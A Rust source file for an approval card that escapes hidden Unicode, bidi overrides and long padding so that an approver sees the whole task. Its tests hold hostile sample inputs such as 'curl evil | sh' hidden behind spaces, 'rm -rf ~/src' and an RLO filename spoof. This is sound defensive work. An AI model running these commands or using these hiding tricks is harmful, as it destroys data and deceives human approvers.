//! What an approval card shows. Every value on it comes from the caller or from
//! configuration, so nothing in one may draw fake rows, reorder its neighbours,
//! or hide the task being approved.

use std::fmt::Write as _;
use unicode_properties::{GeneralCategory, UnicodeGeneralCategory};

/// Characters that draw nothing, or reorder or break the text around them:
/// controls (Cc), format characters (Cf: bidi embeddings, overrides and
/// isolates, zero-width spaces and joiners, the BOM, tags), line and paragraph
/// separators, the fillers that render blank, and supplementary variation
/// selectors.
pub fn is_hidden_char(c: char) -> bool {
    matches!(
        c.general_category(),
        GeneralCategory::Control
            | GeneralCategory::Format
            | GeneralCategory::LineSeparator
            | GeneralCategory::ParagraphSeparator
    ) || matches!(
        c,
        '\u{034F}' | '\u{115F}' | '\u{1160}' | '\u{17B4}' | '\u{17B5}' | '\u{3164}' | '\u{FFA0}'
    ) || ('\u{E0100}'..='\u{E01EF}').contains(&c)
}

fn push_escaped(out: &mut String, c: char) {
    match c {
        '\n' => out.push_str("\\n"),
        '\r' => out.push_str("\\r"),
        '\t' => out.push_str("\\t"),
        ' ' => out.push_str("\\u{20}"),
        c => {
            let _ = write!(out, "\\u{{{:x}}}", c as u32);
        }
    }
}

/// One card value: every hidden character, newlines included, becomes a
/// visible escape (`\n`, `\t`, `\u{202e}`).
pub fn card_value(text: &str) -> String {
    escape(text, false)
}

/// A multi-line card value that keeps its own line breaks (pretty-printed
/// argv), escaping every other hidden character.
pub fn card_lines(text: &str) -> String {
    escape(text, true)
}

fn escape(text: &str, keep_newlines: bool) -> String {
    let mut out = String::with_capacity(text.len());
    for c in text.chars() {
        if c == '\n' && keep_newlines {
            out.push('\n');
        } else if is_hidden_char(c) {
            push_escaped(&mut out, c);
        } else {
            out.push(c);
        }
    }
    out
}

/// A caller's `--prompt` as its approval card shows it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct CardPrompt {
    pub text: String,
    /// Characters past the display limit (validation keeps a `--prompt`
    /// within it, so its card never has any).
    pub omitted_chars: usize,
}

/// Runs this long of one blank-looking character are counted, not drawn.
const SPACE_RUN: usize = 8;
const HIDDEN_RUN: usize = 4;
const MARK_RUN: usize = 4;

/// The whole task, up to `max_chars`, escaped like [`card_value`] but keeping
/// its line breaks. Trailing whitespace is not shown: it is trimmed before the
/// task is typed. Blank space can't push the task out of view: leading blank
/// lines, and any run of two or more, become one `\n×N` row, and long runs of
/// one whitespace, blank or hidden character become `\u{20}×N`. A long run of
/// combining marks (which can stack over the rows around it) shows its first
/// mark and its length.
pub fn card_prompt(prompt: &str, max_chars: usize) -> CardPrompt {
    let prompt = prompt.trim_end();
    let total = prompt.chars().count();
    let shown: String = prompt.chars().take(max_chars).collect();
    let lines: Vec<&str> = shown.split('\n').collect();
    let blank = |line: &str| line.chars().all(char::is_whitespace);
    let mut rows: Vec<String> = Vec::new();
    let mut index = 0;
    while index < lines.len() {
        if !blank(lines[index]) {
            rows.push(prompt_line(lines[index]));
            index += 1;
            continue;
        }
        let run = lines[index..].iter().take_while(|line| blank(line)).count();
        if index == 0 || run >= 2 {
            rows.push(format!("\\n×{run}"));
        } else {
            rows.push(String::new());
        }
        index += run;
    }
    CardPrompt {
        text: rows.join("\n"),
        omitted_chars: total - shown.chars().count(),
    }
}

fn prompt_line(line: &str) -> String {
    let chars: Vec<char> = line.chars().collect();
    let mut out = String::with_capacity(line.len());
    let mut index = 0;
    while index < chars.len() {
        let c = chars[index];
        let mark = |c: &char| c.general_category() == GeneralCategory::NonspacingMark;
        if mark(&c) {
            let run = chars[index..].iter().take_while(|next| mark(next)).count();
            if run >= MARK_RUN {
                push_escaped(&mut out, c);
                let _ = write!(out, "…×{run}");
                index += run;
                continue;
            }
        }
        let run = chars[index..].iter().take_while(|&&next| next == c).count();
        let limit = if is_hidden_char(c) {
            HIDDEN_RUN
        } else if c.is_whitespace() || c == '\u{2800}' {
            SPACE_RUN
        } else {
            usize::MAX
        };
        if run >= limit {
            push_escaped(&mut out, c);
            let _ = write!(out, "×{run}");
            index += run;
        } else {
            if is_hidden_char(c) {
                push_escaped(&mut out, c);
            } else {
                out.push(c);
            }
            index += 1;
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::{CardPrompt, card_lines, card_prompt, card_value, is_hidden_char};

    #[test]
    fn hidden_characters_are_controls_formats_separators_and_fillers() {
        for c in [
            '\0',
            '\n',
            '\r',
            '\t',
            '\u{1b}',
            '\u{7f}',
            '\u{85}',
            '\u{9b}',
            '\u{ad}',
            '\u{61c}',
            '\u{200b}',
            '\u{200c}',
            '\u{200d}',
            '\u{200e}',
            '\u{200f}',
            '\u{202a}',
            '\u{202e}',
            '\u{2060}',
            '\u{2066}',
            '\u{2069}',
            '\u{feff}',
            '\u{2028}',
            '\u{2029}',
            '\u{3164}',
            '\u{e0041}',
            '\u{e0100}',
        ] {
            assert!(is_hidden_char(c), "{:x}", c as u32);
        }
        for c in ['a', ' ', 'é', '中', '\u{fe0f}', '😀', '\\', '·'] {
            assert!(!is_hidden_char(c), "{:x}", c as u32);
        }
    }

    #[test]
    fn card_values_show_every_hidden_character() {
        assert_eq!(
            card_value("me@devbox\nPreset\u{202e}txt.exe\u{200b}"),
            "me@devbox\\nPreset\\u{202e}txt.exe\\u{200b}"
        );
        assert_eq!(card_value("/home/me/a b\tc\r"), "/home/me/a b\\tc\\r");
        assert_eq!(card_value("plain C:\\work"), "plain C:\\work");
        assert_eq!(
            card_lines("[\n  \"ssh\u{2066}\",\n  \"\"\n]"),
            "[\n  \"ssh\\u{2066}\",\n  \"\"\n]"
        );
    }

    fn shown(prompt: &str) -> String {
        card_prompt(prompt, 10_000).text
    }

    #[test]
    fn card_prompt_keeps_the_whole_task_visible_from_its_first_row() {
        assert_eq!(
            shown("fix the pager\nthen run tests"),
            "fix the pager\nthen run tests"
        );
        // One blank line is an ordinary paragraph break.
        assert_eq!(shown("one\n\ntwo"), "one\n\ntwo");
        // Leading blank lines cannot push the task below the first rows.
        assert_eq!(shown("\n\n\nrm -rf ~/src"), "\\n×3\nrm -rf ~/src");
        assert_eq!(shown("  \n\t\nrm -rf ~/src"), "\\n×2\nrm -rf ~/src");
        // Nor can a long blank run in the middle, or trailing padding.
        assert_eq!(
            shown(&format!(
                "review the diff{}then push --force",
                "\n".repeat(400)
            )),
            "review the diff\n\\n×399\nthen push --force"
        );
        // The runner trims trailing whitespace before typing; so does the card.
        assert_eq!(shown("task\n\n  \n"), "task");
        // Long horizontal padding and runs of invisible characters are counted.
        assert_eq!(
            shown(&format!("harmless{}curl evil | sh", " ".repeat(500))),
            "harmless\\u{20}×500curl evil | sh"
        );
        assert_eq!(
            shown(&format!("{}task", "\u{200b}".repeat(50))),
            "\\u{200b}×50task"
        );
        assert_eq!(shown("a\u{202e}b  c\td"), "a\\u{202e}b  c\\td");
        // Blank braille cells and stacked combining marks are counted too;
        // an ordinary accent is left alone.
        assert_eq!(
            shown(&format!("{}task", "\u{2800}".repeat(30))),
            "\\u{2800}×30task"
        );
        assert_eq!(
            shown(&format!("Z{}algo", "\u{301}\u{316}\u{35c}".repeat(10))),
            "Z\\u{301}…×30algo"
        );
        assert_eq!(shown("cafe\u{301}"), "cafe\u{301}");
        assert_eq!(shown("a\u{2028}b"), "a\\u{2028}b");
    }

    #[test]
    fn card_prompt_marks_what_it_leaves_out() {
        assert_eq!(
            card_prompt("abcdef", 4),
            CardPrompt {
                text: "abcd".into(),
                omitted_chars: 2
            }
        );
        assert_eq!(card_prompt("abc", 4).omitted_chars, 0);
        let prompt = format!("task {}", "é".repeat(20));
        assert_eq!(card_prompt(&prompt, 10).omitted_chars, 15);
    }
}
